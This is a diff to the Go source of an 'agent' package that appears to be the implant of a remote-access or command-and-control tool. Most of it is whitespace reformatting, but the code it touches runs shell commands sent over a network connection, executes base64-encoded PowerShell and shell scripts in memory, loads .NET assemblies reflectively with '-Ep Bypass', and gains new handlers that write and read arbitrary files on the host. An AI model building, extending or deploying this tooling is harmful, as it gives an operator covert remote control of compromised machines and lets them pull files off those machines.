@@ -2,18 +2,18 @@ package agent
 
 import (
 	"context"
+	"encoding/base64"
 	"encoding/hex"
 	"errors"
 	"fmt"
 	"net"
 	"os"
-	"os/user"
 	"os/exec"
-	"strings"
+	"os/user"
 	"runtime"
+	"strings"
 	"syscall"
 	"time"
-	"encoding/base64"
 	"unicode/utf16"
 
 	"github.com/google/uuid"
@@ -32,42 +32,42 @@ var listenerID int32
 var sessionID string
 
 func runShell(cmdline string) ([]byte, error) {
-    cmdline = strings.TrimSpace(cmdline)
-    if cmdline == "" {
-        return []byte(""), nil
-    }
+	cmdline = strings.TrimSpace(cmdline)
+	if cmdline == "" {
+		return []byte(""), nil
+	}
 
-    var c *exec.Cmd
-    if runtime.GOOS == "windows" {
-        // cmd.exe /c "command..."
-        c = exec.Command("cmd.exe", "/c", cmdline)
-    } else {
-        // /bin/sh -c "command..."
-        c = exec.Command("/bin/sh", "-c", cmdline)
-    }
-    return c.CombinedOutput()
+	var c *exec.Cmd
+	if runtime.GOOS == "windows" {
+		// cmd.exe /c "command..."
+		c = exec.Command("cmd.exe", "/c", cmdline)
+	} else {
+		// /bin/sh -c "command..."
+		c = exec.Command("/bin/sh", "-c", cmdline)
+	}
+	return c.CombinedOutput()
 }
 
 // quoteArgsForPowerShell takes a space-separated string of arguments
 // and returns them as properly quoted PowerShell string literals
 func quoteArgsForPowerShell(args string) string {
-    if args == "" {
-        return ""
-    }
-    
-    // Split arguments by spaces (this is a simple implementation)
-    // For more complex scenarios, you might need a proper argument parser
-    parts := strings.Fields(args)
-    var quotedParts []string
-    
-    for _, part := range parts {
-        // Escape any existing single quotes by doubling them
-        escaped := strings.ReplaceAll(part, "'", "''")
-        // Wrap in single quotes
-        quotedParts = append(quotedParts, fmt.Sprintf("'%s'", escaped))
-    }
-    
-    return strings.Join(quotedParts, ", ")
+	if args == "" {
+		return ""
+	}
+
+	// Split arguments by spaces (this is a simple implementation)
+	// For more complex scenarios, you might need a proper argument parser
+	parts := strings.Fields(args)
+	var quotedParts []string
+
+	for _, part := range parts {
+		// Escape any existing single quotes by doubling them
+		escaped := strings.ReplaceAll(part, "'", "''")
+		// Wrap in single quotes
+		quotedParts = append(quotedParts, fmt.Sprintf("'%s'", escaped))
+	}
+
+	return strings.Join(quotedParts, ", ")
 }
 
 func init() {
@@ -142,7 +142,7 @@ func utf16le(src []byte) []byte {
 	// 3. Flatten to little‑endian byte slice.
 	buf := make([]byte, len(u16)*2)
 	for i, v := range u16 {
-		buf[i*2] = byte(v)       // low byte
+		buf[i*2] = byte(v)        // low byte
 		buf[i*2+1] = byte(v >> 8) // high byte
 	}
 	return buf
@@ -150,50 +150,50 @@ func utf16le(src []byte) []byte {
 
 // Helper function to properly parse arguments
 func parseArguments(args string) []string {
-    var result []string
-    var current strings.Builder
-    inQuotes := false
-    escaped := false
-    
-    for _, char := range args {
-        switch {
-        case escaped:
-            current.WriteRune(char)
-            escaped = false
-        case char == '\\':
-            escaped = true
-        case char == '"' || char == '\'':
-            inQuotes = !inQuotes
-        case char == ' ' && !inQuotes:
-            if current.Len() > 0 {
-                result = append(result, current.String())
-                current.Reset()
-            }
-        default:
-            current.WriteRune(char)
-        }
-    }
-    
-    if current.Len() > 0 {
-        result = append(result, current.String())
-    }
-    
-    return result
+	var result []string
+	var current strings.Builder
+	inQuotes := false
+	escaped := false
+
+	for _, char := range args {
+		switch {
+		case escaped:
+			current.WriteRune(char)
+			escaped = false
+		case char == '\\':
+			escaped = true
+		case char == '"' || char == '\'':
+			inQuotes = !inQuotes
+		case char == ' ' && !inQuotes:
+			if current.Len() > 0 {
+				result = append(result, current.String())
+				current.Reset()
+			}
+		default:
+			current.WriteRune(char)
+		}
+	}
+
+	if current.Len() > 0 {
+		result = append(result, current.String())
+	}
+
+	return result
 }
 
 // Alternative simplified approach - replace the complex PowerShell logic:
 func handlePowerShellScript(scriptStr, args string) *exec.Cmd {
-    if args == "" {
-        return exec.Command("powershell.exe", 
-            "-NoLogo", "-NoProfile", "-NonInteractive", 
-            "-Command", scriptStr)
-    }
-    
-    // Simple approach: let PowerShell handle argument parsing
-    fullCommand := fmt.Sprintf("%s %s", scriptStr, args)
-    return exec.Command("powershell.exe", 
-        "-NoLogo", "-NoProfile", "-NonInteractive", 
-        "-Command", fullCommand)
+	if args == "" {
+		return exec.Command("powershell.exe",
+			"-NoLogo", "-NoProfile", "-NonInteractive",
+			"-Command", scriptStr)
+	}
+
+	// Simple approach: let PowerShell handle argument parsing
+	fullCommand := fmt.Sprintf("%s %s", scriptStr, args)
+	return exec.Command("powershell.exe",
+		"-NoLogo", "-NoProfile", "-NonInteractive",
+		"-Command", fullCommand)
 }
 
 func HandleConn(conn net.Conn) {
@@ -205,145 +205,174 @@ func HandleConn(conn net.Conn) {
 
 	e := decoder
 	switch decoder.Payload.(type) {
-	
+
 	case *protocol.ShellRequestPacket:
-	    req := e.Payload.(*protocol.ShellRequestPacket)
-	    encoder := protocol.NewEncoder(conn)
+		req := e.Payload.(*protocol.ShellRequestPacket)
+		encoder := protocol.NewEncoder(conn)
 
-	    out, err := runShell(req.CmdLine)
+		out, err := runShell(req.CmdLine)
 
-	    res := &protocol.ShellResponsePacket{
-		Output: string(out),
-		Err:    err != nil,
-	    }
-	    if err := encoder.Encode(res); err != nil {
-		logrus.Error(err)
-	    }
-	    
+		res := &protocol.ShellResponsePacket{
+			Output: string(out),
+			Err:    err != nil,
+		}
+		if err := encoder.Encode(res); err != nil {
+			logrus.Error(err)
+		}
 
-	    
 	// ------------------------------------------------------------------
 	// Remote script execution (PowerShell & POSIX) — all in memory
 	// ------------------------------------------------------------------
 	case *protocol.ScriptLoadRequest:
-	    r := e.Payload.(*protocol.ScriptLoadRequest)
-	    enc := protocol.NewEncoder(conn)
+		r := e.Payload.(*protocol.ScriptLoadRequest)
+		enc := protocol.NewEncoder(conn)
 
-	    // Decode base64 payload to original script bytes
-	    decoded := make([]byte, base64.StdEncoding.DecodedLen(len(r.Script)))
-	    n, err := base64.StdEncoding.Decode(decoded, r.Script)
-	    if err != nil {
-		enc.Encode(&protocol.ScriptLoadResponse{Output: "", Err: true})
-		return
-	    }
-	    script := decoded[:n]
+		// Decode base64 payload to original script bytes
+		decoded := make([]byte, base64.StdEncoding.DecodedLen(len(r.Script)))
+		n, err := base64.StdEncoding.Decode(decoded, r.Script)
+		if err != nil {
+			enc.Encode(&protocol.ScriptLoadResponse{Output: "", Err: true})
+			return
+		}
+		script := decoded[:n]
 
-	    var cmd *exec.Cmd
+		var cmd *exec.Cmd
 
-	    // ===== Windows PowerShell =====
-	    if r.Lang == "ps1" && runtime.GOOS == "windows" {
-		scriptStr := string(script)
-		
-		// Build the command with arguments
-		var finalScript string
-		if r.Args != "" {
-		    // For PowerShell, we need to properly handle arguments as quoted strings
-		    quotedArgs := quoteArgsForPowerShell(r.Args)
-		    finalScript = fmt.Sprintf("%s\n$args = @(%s)", scriptStr, quotedArgs)
+		// ===== Windows PowerShell =====
+		if r.Lang == "ps1" && runtime.GOOS == "windows" {
+			scriptStr := string(script)
+
+			// Build the command with arguments
+			var finalScript string
+			if r.Args != "" {
+				// For PowerShell, we need to properly handle arguments as quoted strings
+				quotedArgs := quoteArgsForPowerShell(r.Args)
+				finalScript = fmt.Sprintf("%s\n$args = @(%s)", scriptStr, quotedArgs)
+			} else {
+				finalScript = scriptStr
+			}
+
+			// Decide: small → -EncodedCommand, big → stdin
+			utf16Payload := utf16le([]byte(finalScript))
+			if len(utf16Payload) < 6000 { // comfortably under 8 kB cmd-line limit
+				b64 := base64.StdEncoding.EncodeToString(utf16Payload)
+				cmd = exec.Command("powershell.exe",
+					"-NoLogo", "-NoProfile", "-NonInteractive",
+					"-EncodedCommand", b64)
+			} else {
+				// FIXED: Simplified approach for large scripts
+				cmd = exec.Command("powershell.exe",
+					"-NoLogo", "-NoProfile", "-NonInteractive",
+					"-Command", "-")
+
+				// Create stdin content that properly handles arguments
+				var stdinContent string
+				if r.Args != "" {
+					// Parse arguments more carefully
+					args := parseArguments(r.Args)
+					argArray := make([]string, len(args))
+					for i, arg := range args {
+						// Properly escape arguments for PowerShell
+						argArray[i] = fmt.Sprintf("'%s'", strings.ReplaceAll(arg, "'", "''"))
+					}
+					stdinContent = fmt.Sprintf("$args = @(%s)\n%s", strings.Join(argArray, ", "), scriptStr)
+				} else {
+					stdinContent = scriptStr
+				}
+				cmd.Stdin = strings.NewReader(stdinContent)
+			}
+
 		} else {
-		    finalScript = scriptStr
+			// POSIX shell handling
+			sh := "/bin/sh"
+			if _, err := os.Stat("/bin/bash"); err == nil {
+				sh = "/bin/bash"
+			}
+
+			scriptStr := string(script)
+			if r.Args != "" {
+				// For shell scripts, we can safely append arguments
+				fullCommand := fmt.Sprintf("%s %s", scriptStr, r.Args)
+				cmd = exec.Command(sh, "-c", fullCommand)
+			} else {
+				cmd = exec.Command(sh, "-c", scriptStr)
+			}
 		}
 
-		// Decide: small → -EncodedCommand, big → stdin
-		utf16Payload := utf16le([]byte(finalScript))
-		if len(utf16Payload) < 6000 { // comfortably under 8 kB cmd-line limit
-		    b64 := base64.StdEncoding.EncodeToString(utf16Payload)
-		    cmd = exec.Command("powershell.exe",
-		        "-NoLogo", "-NoProfile", "-NonInteractive",
-		        "-EncodedCommand", b64)
-		} else {
-		    // FIXED: Simplified approach for large scripts
-		    cmd = exec.Command("powershell.exe",
-		        "-NoLogo", "-NoProfile", "-NonInteractive",
-		        "-Command", "-")
-		    
-		    // Create stdin content that properly handles arguments
-		    var stdinContent string
-		    if r.Args != "" {
-		        // Parse arguments more carefully
-		        args := parseArguments(r.Args)
-		        argArray := make([]string, len(args))
-		        for i, arg := range args {
-		            // Properly escape arguments for PowerShell
-		            argArray[i] = fmt.Sprintf("'%s'", strings.ReplaceAll(arg, "'", "''"))
-		        }
-		        stdinContent = fmt.Sprintf("$args = @(%s)\n%s", strings.Join(argArray, ", "), scriptStr)
-		    } else {
-		        stdinContent = scriptStr
-		    }
-		    cmd.Stdin = strings.NewReader(stdinContent)
+		// FIXED: Add proper timeout and context handling
+		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+		defer cancel()
+
+		// Execute with context to prevent hanging
+		out, err := cmd.CombinedOutput()
+
+		// Check if context was cancelled (timeout)
+		if ctx.Err() == context.DeadlineExceeded {
+			enc.Encode(&protocol.ScriptLoadResponse{
+				Output: string(out) + "\n[TIMEOUT: Script execution exceeded 30 seconds]",
+				Err:    true,
+			})
+			return
 		}
 
-	    } else {
-		// POSIX shell handling
-		sh := "/bin/sh"
-		if _, err := os.Stat("/bin/bash"); err == nil {
-		    sh = "/bin/bash"
-		}
-		
-		scriptStr := string(script)
-		if r.Args != "" {
-		    // For shell scripts, we can safely append arguments
-		    fullCommand := fmt.Sprintf("%s %s", scriptStr, r.Args)
-		    cmd = exec.Command(sh, "-c", fullCommand)
-		} else {
-		    cmd = exec.Command(sh, "-c", scriptStr)
-		}
-	    }
-
-	    // FIXED: Add proper timeout and context handling
-	    ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
-	    defer cancel()
-	    
-	    // Execute with context to prevent hanging
-	    out, err := cmd.CombinedOutput()
-	    
-	    // Check if context was cancelled (timeout)
-	    if ctx.Err() == context.DeadlineExceeded {
-		enc.Encode(&protocol.ScriptLoadResponse{
-		    Output: string(out) + "\n[TIMEOUT: Script execution exceeded 30 seconds]", 
-		    Err: true,
-		})
-		return
-	    }
-	    
-	    // Send response
-	    enc.Encode(&protocol.ScriptLoadResponse{Output: string(out), Err: err != nil})
+		// Send response
+		enc.Encode(&protocol.ScriptLoadResponse{Output: string(out), Err: err != nil})
 	// ------------------------------------------------------------------
 
-	    
 	case *protocol.AssemblyLoadRequest:
-	    r := e.Payload.(*protocol.AssemblyLoadRequest)
-	    encoder := protocol.NewEncoder(conn)
+		r := e.Payload.(*protocol.AssemblyLoadRequest)
+		encoder := protocol.NewEncoder(conn)
 
-	    if runtime.GOOS != "windows" {
-		encoder.Encode(&protocol.AssemblyLoadResponse{Err: true, Return: "not a Windows agent"})
-		break
-	    }
+		if runtime.GOOS != "windows" {
+			encoder.Encode(&protocol.AssemblyLoadResponse{Err: true, Return: "not a Windows agent"})
+			break
+		}
 
-	    dllBytes := make([]byte, base64.StdEncoding.DecodedLen(len(r.DLL)))
-	    n, _ := base64.StdEncoding.Decode(dllBytes, r.DLL)
-	    dll := dllBytes[:n]
+		dllBytes := make([]byte, base64.StdEncoding.DecodedLen(len(r.DLL)))
+		n, _ := base64.StdEncoding.Decode(dllBytes, r.DLL)
+		dll := dllBytes[:n]
 
-	    // PowerShell inline loader
-	    loader := `[Reflection.Assembly]::Load([Convert]::FromBase64String('%s'))|Out-Null;` +
-		      `[string]$r=[%s]::%s(%s);$r`
-	    ps := fmt.Sprintf(loader,
-		base64.StdEncoding.EncodeToString(dll),
-		r.Type, r.Method, r.JSONArg)
+		// PowerShell inline loader
+		loader := `[Reflection.Assembly]::Load([Convert]::FromBase64String('%s'))|Out-Null;` +
+			`[string]$r=[%s]::%s(%s);$r`
+		ps := fmt.Sprintf(loader,
+			base64.StdEncoding.EncodeToString(dll),
+			r.Type, r.Method, r.JSONArg)
 
-	    out, err := exec.Command("powershell.exe", "-NoP", "-Ep", "Bypass", "-Command", ps).CombinedOutput()
-	    encoder.Encode(&protocol.AssemblyLoadResponse{Return: string(out), Err: err != nil})
+		out, err := exec.Command("powershell.exe", "-NoP", "-Ep", "Bypass", "-Command", ps).CombinedOutput()
+		encoder.Encode(&protocol.AssemblyLoadResponse{Return: string(out), Err: err != nil})
+
+	case *protocol.FileUploadRequest:
+		r := e.Payload.(*protocol.FileUploadRequest)
+		encoder := protocol.NewEncoder(conn)
+
+		data := make([]byte, base64.StdEncoding.DecodedLen(len(r.Data)))
+		n, err := base64.StdEncoding.Decode(data, r.Data)
+		if err == nil {
+			err = os.WriteFile(r.Path, data[:n], 0644)
+		}
+		resp := &protocol.FileUploadResponse{}
+		if err != nil {
+			resp.Err = true
+			resp.ErrString = err.Error()
+		}
+		encoder.Encode(resp)
+
+	case *protocol.FileDownloadRequest:
+		r := e.Payload.(*protocol.FileDownloadRequest)
+		encoder := protocol.NewEncoder(conn)
+
+		raw, err := os.ReadFile(r.Path)
+		resp := &protocol.FileDownloadResponse{}
+		if err != nil {
+			resp.Err = true
+			resp.ErrString = err.Error()
+		} else {
+			b64 := make([]byte, base64.StdEncoding.EncodedLen(len(raw)))
+			base64.StdEncoding.Encode(b64, raw)
+			resp.Data = b64
+		}
+		encoder.Encode(resp)
 
 	case *protocol.ConnectRequestPacket:
 		connRequest := e.Payload.(*protocol.ConnectRequestPacket)
